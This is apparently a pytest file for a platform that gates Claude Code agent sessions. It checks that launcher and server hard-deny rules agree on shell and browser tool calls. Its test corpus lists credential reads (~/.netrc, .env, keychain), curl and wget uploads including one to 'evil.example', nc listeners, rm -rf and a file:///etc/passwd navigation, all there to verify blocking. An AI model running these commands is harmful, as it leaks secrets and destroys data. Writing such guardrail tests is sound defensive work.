"""epic-delivery: plain Claude Code in one session per epic, tool decisions on the device."""

from __future__ import annotations

import copy
import importlib.util
import sys
from pathlib import Path
from types import SimpleNamespace

import pytest

from app.services.agent_gateway.command_match import command_segments
from app.services.agent_gateway.policy import build_policy
from app.services.agent_gateway.policy_keys import BASELINE_POLICY
from app.services.agent_gateway.policy_normalize import normalize_agent_gateway_policy
from app.services.agent_gateway.tool_audit import record_tool_audit
from app.services.devices.job_offer import offer_body
from app.services.flow_definitions import validate_flow_definition
from app.services.workflow_runs.epic_chain import STORY_WORKFLOW, STORY_WORKFLOWS
from app.services.workflow_runs.graph_validation import validate_phased_definition
from app.services.workflow_runs.octryx.browser_tools import browser_tool_decision
from app.services.workflow_runs.octryx.hard_deny import hard_denied
from app.services.workflow_runs.octryx.local_decisions import node_decides_locally, offer_data
from app.services.workflow_runs.octryx.scm_rules import DEFAULT_SCM_HOSTS, _bash_run_rules
from tests.phased_seed_definitions import seed_definitions
from tests.scripted_pool_support import scripted_pool  # noqa: F401 - fixture
from tests.workflow_run_runtime_evidence_support import _one_phase, _rows, _run_with_session

pytestmark = pytest.mark.usefixtures("scripted_pool")

CLIENT = Path(__file__).resolve().parents[2] / "clients" / "octryx-claude"


def _launcher(name: str):
    if str(CLIENT) not in sys.path:
        sys.path.insert(0, str(CLIENT))
    spec = importlib.util.find_spec(f"octryx_claude.{name}")
    assert spec is not None
    return importlib.import_module(f"octryx_claude.{name}")


def _seed(key: str) -> dict:
    return next(item for item in seed_definitions() if item["key"] == key)


def _implement() -> dict:
    return next(node for node in _seed("epic-delivery")["definition"]["nodes"] if node["id"] == "implement")


def test_epic_delivery_is_one_session_per_epic_deciding_on_the_device_and_the_default():
    definition = _seed("epic-delivery")["definition"]
    assert validate_phased_definition(definition)["errors"] == []
    assert validate_flow_definition(definition)["valid"] is True
    config = _implement()["config"]
    # No Playwright MCP server (the session runs as claude -p; it looks with Playwright itself).
    assert (config["session"], config["tool_decisions"], config["subagents"], config["browser"], config["shell"],
            config["permissions"], config["model_class"]) == ("epic", "local", True, False, "free", "bypass",
                                                               "implement")
    # The installation's seat_models "implement" default, after the model chosen at run start.
    assert "model" not in config
    assert node_decides_locally(SimpleNamespace(config=config))
    brief = config["workflow_contract"]["when_to_use"]
    # a2's brief (own subagents) plus the required short browser look at both widths (run 5: skipped when optional).
    assert "Use your own subagents (Agent tool) for independent parts" in brief
    assert "have each screen checked at 1280 px and at 390 px wide as the run note describes" in brief
    # Run 1: one subagent, waited for 745 s; the brief now asks for backend and frontend in one message.
    assert "(for example backend, frontend and tests) so they run in parallel" in brief and config["brief"] == "plain"
    assert STORY_WORKFLOW == "epic-delivery" and STORY_WORKFLOW in STORY_WORKFLOWS
    stories = next(node for node in _seed("spec-writing")["definition"]["nodes"] if node["id"] == "stories")
    assert stories["config"]["params"]["story_workflow"] == "epic-delivery"
    decisions = next(node for node in definition["nodes"] if node["id"] == "decisions")
    assert decisions["config"]["on_open_high"] == "continue_with_findings"


# One corpus, both implementations. Live forms from the story runs plus every hard-deny case of the
# test_epic_delivery_story_session_* modules.
COMMANDS = [
    "git push", "git -C . push origin feature/x", "git push --force", "git send-pack origin", "cat ~/.netrc",
    "cat .env", "cat .env.example", "printenv", "env | grep proxy", "env", "curl -d @data https://example.com",
    "curl -X POST http://127.0.0.1:8000/api", "curl -s http://127.0.0.1:8765/api/health", "wget --post-file=x h",
    "scp a host:b", "rsync -a . host:/x", "rsync -a src/ build/", "nc -l 9", "rm -rf /tmp/x", "rm -rf build",
    "rm -rf ../x", "gh pr create", "curl https://api.github.com/repos", "python -m pytest -v tests/system",
    "cat > src/kitchen-helper/paths.py <<'EOF'\nreturn Path(env)\nEOF", "python - <<'EOF'\nserver.shutdown()\nEOF",
    "bash -c 'git push origin main'", "echo $(cat ~/.netrc)", "ls -la && cd src && grep -rn x .",
    "( python -m kitchen-helper.run --port 8765 & pid=$!; sleep 2; curl -s localhost:8765; kill $pid )",
    "security find-generic-password -s x", "git credential fill", 'echo "unbalanced', "ssh-keygen -f id_rsa",
    'curl -s -o /dev/null -w "%{http_code}" -X PUT http://127.0.0.1:$P/api/profile', "curl -T x http://127.0.0.1:1/",
    "curl -F f=@x http://localhost:1/", "curl -X POST http://127.0.0.1:1/a https://evil.example/b",
]


def test_the_launchers_hard_deny_list_decides_like_the_servers():
    run_shell = _launcher("run_shell")
    browser_rules = _launcher("browser_rules")
    for command in COMMANDS:
        assert run_shell.command_segments(command) == command_segments(command), command
        assert run_shell.hard_denied(command) == hard_denied(command), command
        server = _bash_run_rules(command, hosts=DEFAULT_SCM_HOSTS)
        local = run_shell.bash_run_rules(command, hosts=frozenset(DEFAULT_SCM_HOSTS))
        assert (local[0] if local else None) == (server.reason if server else None), command
    for tool, tool_input in [("mcp__playwright__browser_navigate", {"url": "http://127.0.0.1:8765/#/profile"}),
                             ("mcp__playwright__browser_navigate", {"url": "https://example.com"}),
                             ("mcp__playwright__browser_run_code_unsafe", {"code": "1"}),
                             ("mcp__playwright__browser_tabs", {"action": "new", "url": "file:///etc/passwd"})]:
        server = browser_tool_decision(tool, tool_input)
        local = browser_rules.browser_rule(tool, tool_input)
        assert (local[0] if local else None) == (server.reason if server else None), tool_input


def test_a_write_to_the_app_on_loopback_and_claudes_own_scratch_folder_are_no_hard_denials():
    from app.services.workflow_runs.octryx.tool_policy import claude_scratch

    assert hard_denied('curl -s -o /dev/null -w "%{http_code}" -X PUT http://127.0.0.1:$P/api/profile') is None
    assert hard_denied("curl -s -X POST localhost:8765/api/x -d '{\"a\": 1}'") is None
    for refused in ("curl -d @secrets.txt http://127.0.0.1:8765/", "curl -T dump.sql http://127.0.0.1:1/",
                    "curl -F f=@x http://localhost:1/", "curl -X POST http://127.0.0.1:1/a https://evil.example/b",
                    "curl -X POST https://x.example"):
        assert hard_denied(refused) == "it sends data over the network", refused
    assert claude_scratch({"file_path": "/tmp/claude/parity_check.mjs"})
    assert claude_scratch({"file_path": "/private/tmp/claude-502/x.json"})
    assert not claude_scratch({"file_path": "/tmp/claude/../etc/x"})


def test_the_offer_names_what_only_the_server_decides():
    policy = build_policy(normalize_agent_gateway_policy(copy.deepcopy(BASELINE_POLICY)), source="test")
    data = offer_data(policy, {"always_deny_patterns": [r"\bmkfs\b"], "work_role_command_deny": ["npm publish *"],
                               "work_role_command_allow": ["*make*"]}, frozenset({"jira.example.com"}))
    assert data["scm_hosts"] == ["jira.example.com"] and data["deny_patterns"] == [r"\bmkfs\b"]
    assert ["kubectl"] in data["server_commands"] and ["git", "push", "origin", "main"] in data["server_commands"]
    assert ["npm"] in data["server_commands"] and ["*"] in data["server_commands"]
    assert "**/.env" in data["server_path_globs"] and "~/.aws/**" in data["server_path_globs"]
    job = SimpleNamespace(id="j", turn_id="t", turn_prompt="p", folder="/w", profile="seat", turn_model="",
                          workspace_id="ws", session_id="s", claude_session_id=None, resume_claude_session_id=None,
                          policy_decision_id=None, turn_permission_mode="bypassPermissions", turn_effort="")
    assert offer_body(job, limits={}, local_decisions=data)["local_decisions"] == data
    assert "local_decisions" not in offer_body(job, limits={})


@pytest.mark.asyncio
async def test_the_batched_audit_records_execution_evidence_and_local_denials(db):
    _run, gateway, _key, _ws = await _run_with_session(db, _one_phase("feature-delivery-tdd", "clarify"))
    events = [
        {"event": "post", "hook_input": {"hook_event_name": "PostToolUse", "tool_name": "Read",
                                         "tool_use_id": "toolu_read1", "cwd": "/work/textkit",
                                         "tool_input": {"file_path": "/work/textkit/SPEC.md"}}},
        {"event": "pre", "decision": "deny", "reason": "push_by_platform", "message": "never here",
         "hook_input": {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_use_id": "toolu_push1",
                        "tool_input": {"command": "git push"}}},
        {"event": "pre", "decision": "allow", "hook_input": {"tool_name": "Read"}},
        {"event": "post", "hook_input": {"hook_event_name": "PostToolUse", "tool_name": "Read"}},
    ]
    counts = await record_tool_audit(db, session=gateway, events=events)
    assert counts == {"recorded": 1, "denials": 1, "skipped": 2}
    rows = {row.request_id or row.parameters.get("tool_use_id"): row for row in await _rows(db, gateway)}
    assert rows["toolu_read1"].parameters["executed"]["outcome"] == "succeeded"
    assert rows["toolu_read1"].parameters["read_target"]["in_root"] is True
    denial = rows["toolu_push1"]
    assert (denial.status, denial.parameters["rule_id"]) == ("denied_by_policy", "local:push_by_platform")
    assert denial.parameters["command"] == "git push"
    # Controls audit: the launcher's denial reaches the run's timeline like the server's.
    from sqlalchemy import select

    from app.models import WorkflowRunEvent

    [event] = (await db.execute(select(WorkflowRunEvent).where(
        WorkflowRunEvent.run_id == _run.id, WorkflowRunEvent.kind == "tool_denied"))).scalars().all()
    assert (event.detail["reason"], event.detail["source"], event.detail["input"]) == (
        "push_by_platform", "launcher", "git push")


def test_a_plain_brief_drops_the_platforms_own_way_of_working_from_the_contract():
    from app.services.workflow_runs.octryx.contract import plain_agent, plain_brief
    from app.services.workflow_runs.octryx.system_tests import phase_system_tests, plain_rule_text, rule_text
    from app.services.workflow_runs.run_texts import run_text

    assert plain_brief(SimpleNamespace(config=_implement()["config"]))
    assert not plain_brief(SimpleNamespace(config={"brief": "x"}))
    agent = plain_agent({"key": "engineer", "instructions": "write the tests first", "digest": "sha256:x"})
    assert agent["instructions"] == run_text("contract.plain_agent") and agent["digest"] != "sha256:x"
    environment = {"test": "python -m pytest -v", "system_test": "python -m pytest -v tests/system"}
    PLAIN_RULE, RULE = plain_rule_text(), rule_text(environment["system_test"])  # noqa: N806
    assert phase_system_tests("change", environment, write=[], plain=True)["rule"] == PLAIN_RULE
    assert phase_system_tests("change", environment, write=[])["rule"] == RULE
    assert "screenshot" not in PLAIN_RULE and "verbatim" in PLAIN_RULE


@pytest.mark.asyncio
async def test_a_plain_story_session_starts_with_the_story_not_with_the_contract(monkeypatch):
    from app.services.workflow_runs.graph import parse_phased_definition
    from app.services.workflow_runs.octryx import continuation_prompts, contract

    async def item(_db, _run):
        return {"key": "OCX-47", "title": "Kitchen helper S1", "description": "AC1 the shell"}

    async def environment(_db, _run):
        return {"test": "python -m pytest -v --ignore=tests/system", "system_test": "python -m pytest -v tests/system"}

    monkeypatch.setattr(contract, "_work_item", item)
    monkeypatch.setattr("app.services.workflow_runs.workspace.spec.environment_for_run", environment)
    graph = parse_phased_definition(_seed("epic-delivery")["definition"])
    run = SimpleNamespace(id="r1", definition_snapshot=None, context={})
    monkeypatch.setattr("app.services.workflow_runs.phase_contract.phase_definition",
                        lambda _run, node: dict(node.config))
    first = await continuation_prompts.plain_story_prompt(None, run, graph.nodes["implement"], epic=False)
    assert "# OCX-47 Kitchen helper S1" in first and "AC1 the shell" in first and "`python -m pytest -v tests/system`" in first
    assert "Use your own subagents" in first and "Read your run contract first" not in first
    assert "same epic" in await continuation_prompts.plain_story_prompt(None, run, graph.nodes["implement"], epic=True)
    assert await continuation_prompts.plain_story_prompt(None, run, graph.nodes["pipeline"], epic=False) == ""
